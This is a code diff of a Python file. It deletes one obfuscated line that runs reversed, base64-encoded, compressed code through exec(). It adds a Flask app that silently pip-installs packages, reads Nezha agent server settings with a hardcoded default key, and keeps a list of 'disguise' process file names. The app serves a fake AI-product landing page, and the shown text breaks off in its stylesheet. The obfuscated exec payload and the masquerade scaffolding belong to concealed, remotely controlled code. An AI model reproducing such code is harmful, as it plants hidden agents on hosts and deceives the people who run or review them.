@@ -1,1 +1,1090 @@
-_ = (lambda __: __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))); exec(_('==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'))
+import os
+import time
+import subprocess
+import platform
+import random
+import sys
+from threading import Thread
+
+try:
+    from flask import Flask
+    import requests
+except ImportError:
+    subprocess.run([sys.executable, "-m", "pip", "install", "flask", "requests", "-q"])
+    from flask import Flask
+    import requests
+
+# ============== 配置 ==============
+FILE_PATH = os.environ.get('FILE_PATH', '.cache')
+PORT = int(os.environ.get('PORT', 7860))
+NEZHA_SERVER = os.environ.get('NEZHA_SERVER', '')
+NEZHA_PORT = os.environ.get('NEZHA_PORT', '')
+NEZHA_KEY = os.environ.get('NEZHA_KEY', 'oZEaed4hQmmjuTBzga1vE5HlUPFbYvCw')
+UUID = os.environ.get('UUID', '37097202-07ef-4ac2-8c11-105906630766')
+PROJECT_URL = os.environ.get('PROJECT_URL', '')
+
+# 伪装文件名
+DISGUISE_NAMES = ['cache_manager', 'session_handler', 'task_worker', 'log_rotator', 'health_check']
+
+# ============== Flask ==============
+app = Flask(__name__)
+application = app
+
+@app.route('/')
+def index():
+    return '''<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nexify | AI Automation Suite — No‑Code Intelligence</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            line-height: 1.6;
+            color: #1e1f2a;
+            background-color: #fefcff;
+        }
+
+        h1, h2, h3, h4, .logo-text, .plan-name, .nav-links a, .cta-button, .secondary-button {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        /* Header & Navigation */
+        header {
+            background-color: rgba(255, 255, 255, 0.96);
+            backdrop-filter: blur(8px);
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.04), 0 2px 8px rgba(0, 0, 0, 0.02);
+            position: fixed;
+            width: 100%;
+            z-index: 1000;
+            transition: all 0.2s;
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 18px 0;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo-icon {
+            color: #8b5cf6;
+            font-size: 28px;
+            background: linear-gradient(135deg, #8b5cf6 0%, #c084fc 100%);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+        }
+
+        .logo-text {
+            font-size: 26px;
+            font-weight: 800;
+            color: #0f0e17;
+            letter-spacing: -0.3px;
+        }
+
+        .logo-text span {
+            background: linear-gradient(120deg, #8b5cf6, #c084fc);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+        }
+
+        .nav-links {
+            display: flex;
+            list-style: none;
+            gap: 36px;
+        }
+
+        .nav-links a {
+            text-decoration: none;
+            color: #3c3e4a;
+            font-weight: 600;
+            font-size: 1rem;
+            transition: color 0.2s;
+        }
+
+        .nav-links a:hover {
+            color: #8b5cf6;
+        }
+
+        .cta-button {
+            background: linear-gradient(105deg, #8b5cf6 0%, #a855f7 100%);
+            color: white;
+            border: none;
+            padding: 10px 26px;
+            border-radius: 40px;
+            font-weight: 700;
+            font-size: 0.95rem;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            box-shadow: 0 4px 12px rgba(139, 92, 246, 0.25);
+        }
+
+        .cta-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(139, 92, 246, 0.3);
+            background: linear-gradient(105deg, #7c3aed, #9333ea);
+        }
+
+        .secondary-button {
+            background-color: transparent;
+            color: #8b5cf6;
+            border: 1.5px solid #d9c9ff;
+            padding: 10px 26px;
+            border-radius: 40px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .secondary-button:hover {
+            background-color: #f5f0ff;
+            border-color: #8b5cf6;
+        }
+
+        .mobile-menu-btn {
+            display: none;
+            background: none;
+            border: none;
+            font-size: 26px;
+            color: #1e1f2a;
+            cursor: pointer;
+        }
+
+        /* Hero Section */
+        .hero {
+            padding: 160px 0 90px;
+            background: radial-gradient(ellipse 80% 50% at 20% 40%, #f3eaff, #ffffff);
+        }
+
+        .hero-content {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 48px;
+        }
+
+        .hero-text {
+            flex: 1;
+        }
+
+        .hero-text h1 {
+            font-size: 52px;
+            font-weight: 800;
+            line-height: 1.2;
+            letter-spacing: -0.02em;
+            margin-bottom: 24px;
+            color: #0f0e17;
+        }
+
+        .hero-text h1 span {
+            background: linear-gradient(135deg, #8b5cf6, #c241ff);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+        }
+
+        .hero-text p {
+            font-size: 1.2rem;
+            color: #4b4b5a;
+            margin-bottom: 36px;
+            max-width: 540px;
+        }
+
+        .hero-buttons {
+            display: flex;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+
+        .hero-image {
+            flex: 1;
+            text-align: center;
+        }
+
+        .hero-image img {
+            max-width: 100%;
+            border-radius: 28px;
+            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(139, 92, 246, 0.15);
+        }
+
+        /* Section titles */
+        .section-title {
+            text-align: center;
+            margin-bottom: 64px;
+        }
+
+        .section-title h2 {
+            font-size: 38px;
+            font-weight: 700;
+            color: #0f0e17;
+            letter-spacing: -0.01em;
+            margin-bottom: 16px;
+        }
+
+        .section-title p {
+            color: #5b5c6e;
+            max-width: 700px;
+            margin: 0 auto;
+            font-size: 1.1rem;
+        }
+
+        /* Features */
+        .features {
+            padding: 100px 0;
+            background-color: #ffffff;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 40px;
+        }
+
+        .feature-card {
+            background: #fff;
+            padding: 32px 28px;
+            border-radius: 28px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.02), 0 2px 6px rgba(0, 0, 0, 0.03);
+            transition: all 0.3s ease;
+            border: 1px solid #f0eaff;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-8px);
+            border-color: #d9c9ff;
+            box-shadow: 0 20px 30px -12px rgba(139, 92, 246, 0.15);
+        }
+
+        .feature-icon {
+            background: #f2ecff;
+            color: #8b5cf6;
+            width: 64px;
+            height: 64px;
+            border-radius: 24px;
